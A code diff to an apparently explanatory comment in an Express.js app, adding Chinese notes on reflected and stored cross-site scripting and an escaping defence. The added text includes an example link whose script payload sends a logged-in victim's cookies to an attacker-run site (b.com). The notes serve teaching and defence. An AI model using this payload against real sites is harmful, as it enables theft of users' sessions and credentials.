@@ -131,12 +131,16 @@ app.post('/process', parseForm, csrfProtection, function(req, res) {
 
 /* Data Validation
 XSS
+我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：http://www.a.com?content=<script>window.open(“www.b.com?param=”+document.cookie)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功
 
-Here we have two similar, but different type of attacks to defend against. One being the Reflected version of cross site scripting the other one is the Stored.
+反射型：诱使用户点起链接，url里面注入恶意js脚本
 
 Reflected Cross site scripting occurs when the attacker injects executable JavaScript code into the HTML response with specially crafted links.
 
-Stored Cross site scripting occurs when the application stores user input which is not correctly filtered. It runs within the user’s browser under the privileges of the web application.
+存储型：存储没有过滤的用户输入，用户输入注入恶意js脚本，存储到服务端
+对用户输入进行过滤，转码< > & " () 大于0x80的ASCII
+在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码
+
 
 To defend against these kind of attacks make sure that you always filter/sanitize user input.
 
